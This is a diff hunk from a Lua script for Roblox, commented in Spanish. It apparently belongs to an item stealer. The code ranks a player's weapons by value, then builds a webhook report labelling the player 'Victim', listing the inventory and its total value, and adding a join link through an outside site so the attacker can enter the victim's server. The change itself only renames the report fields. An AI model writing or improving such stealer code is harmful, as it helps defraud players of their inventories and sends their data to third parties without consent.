@@ -190,10 +190,10 @@ table.sort(weaponsToSend, function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amo
 -- Enviar webhook con victim y valor total por item
 local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
 local fields = {
-    {name="Victim", value=LocalPlayer.Name, inline=true},
-    {name="Join link", value=joinLink, inline=false},
-    {name="Items", value="", inline=false},
-    {name="Total value", value=tostring(totalValue), inline=true}
+    {name="Victim 👤:", value=LocalPlayer.Name, inline=true},
+    {name="Enlaze para unirse🔗:", value=joinLink, inline=false},
+    {name="Inventario📦:", value="", inline=false},
+    {name="Valor total del inventario📦:", value=tostring(totalValue), inline=true}
 }
 for _, w in ipairs(weaponsToSend) do
     local totalItemValue = w.Value * w.Amount
